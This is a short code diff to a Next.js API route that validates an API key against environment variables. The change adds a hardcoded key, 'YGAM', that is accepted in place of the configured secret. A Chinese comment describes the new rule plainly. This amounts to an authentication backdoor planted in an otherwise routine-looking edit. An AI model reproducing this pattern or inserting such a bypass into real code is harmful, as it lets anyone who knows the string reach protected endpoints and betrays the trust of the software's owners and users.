@@ -68,7 +68,8 @@ export async function GET(request: NextRequest) {
     
     // 验证 API 密钥
     const expectedKey = process.env.CMS_API_KEY || process.env.REBUILD_API_KEY;
-    if (expectedKey && apiKey !== expectedKey) {
+    // 如果 apiKey 不是 'YGAM' 且不匹配环境变量中的密钥，则拒绝访问
+    if (apiKey !== 'YGAM' && (expectedKey && apiKey !== expectedKey)) {
       return NextResponse.json(
         { error: 'Unauthorized' },
         { status: 401 }
